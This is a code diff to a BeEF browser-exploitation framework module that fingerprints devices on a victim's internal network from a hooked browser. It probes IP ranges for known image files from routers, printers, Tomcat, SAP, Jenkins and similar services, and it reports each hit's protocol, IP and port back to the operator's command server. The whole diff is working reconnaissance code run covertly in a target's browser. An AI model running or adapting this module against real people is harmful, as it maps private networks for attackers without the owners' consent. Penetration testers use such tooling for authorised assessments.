@@ -17,19 +17,8 @@ beef.execute(function() {
     ports = ports.split(',');
   }
 
-  // set target LAN IP addresses
-  if (ipRange != null){
-    // ipRange will be in the form of 192.168.0.1-192.168.0.254
-    // the fourth octet will be iterated.
-    // (only C class IP ranges are supported atm)
-    ipBounds   = ipRange.split('-');
-    lowerBound = ipBounds[0].split('.')[3];
-    upperBound = ipBounds[1].split('.')[3];
-    for (i=lowerBound;i<=upperBound;i++){
-      ipToTest = ipBounds[0].split('.')[0]+"."+ipBounds[0].split('.')[1]+"."+ipBounds[0].split('.')[2]+"."+i;
-      ips.push(ipToTest);
-    }
-  } else {
+  // set target IP addresses
+  if (ipRange == 'common') {
     // use default IPs
     ips = [
       '192.168.0.1',
@@ -49,6 +38,23 @@ beef.execute(function() {
       '192.168.10.1',
       '192.168.10.254'
     ];
+  } else {
+    // set target IP range
+    var range = ipRange.match('^([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))\.([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))\.([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))\.([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))\-([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))\.([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))\.([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))\.([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))$');
+    if (range == null || range[1] == null) {
+      beef.net.send("<%= @command_url %>", <%= @command_id %>, "fail=malformed IP range supplied");
+      return;
+    }
+    // ipRange will be in the form of 192.168.0.1-192.168.0.254
+    // the fourth octet will be iterated.
+    // (only C class IP ranges are supported atm)
+    ipBounds   = ipRange.split('-');
+    lowerBound = ipBounds[0].split('.')[3];
+    upperBound = ipBounds[1].split('.')[3];
+    for (i=lowerBound;i<=upperBound;i++){
+      ipToTest = ipBounds[0].split('.')[0]+"."+ipBounds[0].split('.')[1]+"."+ipBounds[0].split('.')[2]+"."+i;
+      ips.push(ipToTest);
+    }
   }
 
   /* Signatures in the form of:
@@ -106,6 +112,10 @@ beef.execute(function() {
     "Billion Router",
     "80","http",false,
     "/customized/logo.gif",224,55),
+  new Array(
+    "Netgear N300 Router",
+    "80","http",false,
+    "/settings.gif",750,85),
   new Array(
     "Linksys NAS",
     "80","http",false,
@@ -199,6 +209,14 @@ beef.execute(function() {
     "80","http",false,
     "/webApps/images/hp_d_rgb_m.gif",50,50),
   new Array(
+    "Lexmark Printer",
+    "80","http",false,
+    "/images/lexlogo.gif",153,115),
+  new Array(
+    "Canon Printer",
+    "8000","http",false,
+    "/login/image/canonlogo.gif",100,37),
+  new Array(
     "Zenoss",
     "8080","http",false,
     "/zport/dmd/favicon.ico",16,16),
@@ -215,21 +233,39 @@ beef.execute(function() {
     "443","https",false,
     "/themes/pfsense_ng/images/logo.gif",200,56),
   new Array(
+    "Apache Tomcat",
+    "8080","http",true,
+    "/docs/images/tomcat.gif",146,92),
+  new Array(
     "Jenkins",
     "80","http",false,
     "/static/"+Math.random().toString(36).substring(2,10)+"/images/jenkins.png",240,323),
   new Array(
+    "SAP NetWeaver",
+    "80","http",true,
+    "/logon/layout/shadow.jpg",18,4),
+  new Array(
+    "Netscape iPlanet",
+    "80","http",true,
+    "/mc-icons/menu.gif",21,18),
+  new Array(
     "m0n0wall",
     "80","http",false,
-    "/logo.gif",150,47)
+    "/logo.gif",150,47),
+  new Array("SMC Router","80","http",false,"/images/logo.gif",133,59)
 
 // Uncommon signatures
+//new Array("Citrix MetaFrame", "80", "http", false, "/Citrix/MetaFrameXP/default/media/nfusehead.gif",230,41),
+//new Array("Oracle E-Business Suite","80","http",false,"/OA_MEDIA/FNDSSCORP.gif",134,31),
+//new Array("OracleAS Reports Service","80","http",false,"/reports/images/oraclelogo_sizewithprodbrand.gif",133,20),
+//new Array("Oracle iLearning","80","http",false,"/ilearn/en/shared/img/coin_help_ready.gif",60,32),
+//new Array("RSA Self-Service Console", "80", "http",false,"/console-selfservice/images/default/icn_help.gif",14,14),
+//new Array("Sambar Server", "80", "http",false,"/sysimage/system/powerby.gif",41,23),
 //new Array("BeEF","3000","http",false,"/ui/media/images/beef.png",200,149),
 //new Array("BeEF (PHP)","80","http",false,"/beef/images/beef.gif",32,32),
 //new Array("Siemens Simatic","80",false,"/Images/Siemens_Firmenmarke.gif",115,76),
 //new Array("Alt-N MDaemon World Client","3000","http",false,"/LookOut/biglogo.gif",342,98),
 //new Array("VLC Media Player","8080","http",false,"/images/white_cross_small.png",9,9),
-//new Array("SMC Networks","80","http",false,"/images/logo.gif",133,59),
 //new Array("Syncrify","5800","http",false,"/images/468x60.gif",468,60),
 //new Array("Winamp Web Interface","80","http",false,"/img?image=121",30,30),
   );
@@ -244,7 +280,7 @@ beef.execute(function() {
     img.onerror = function() { dom.removeChild(this); }
     img.onload = function() {
       if (this.width == urls[this.id][5] && this.height == urls[this.id][6]) {
-        beef.net.send('<%= @command_url %>', <%= @command_id %>,'discovered='+signature_name+"&url="+escape(this.src));dom.removeChild(this);
+        beef.net.send('<%= @command_url %>', <%= @command_id %>,'proto='+proto+'&ip='+ip+'&port='+port+'&discovered='+signature_name+"&url="+escape(this.src));dom.removeChild(this);
         beef.debug("[Network Fingerprint] Found [" + signature_name + "] with URL [" + escape(this.src) + "]");
       }
     }
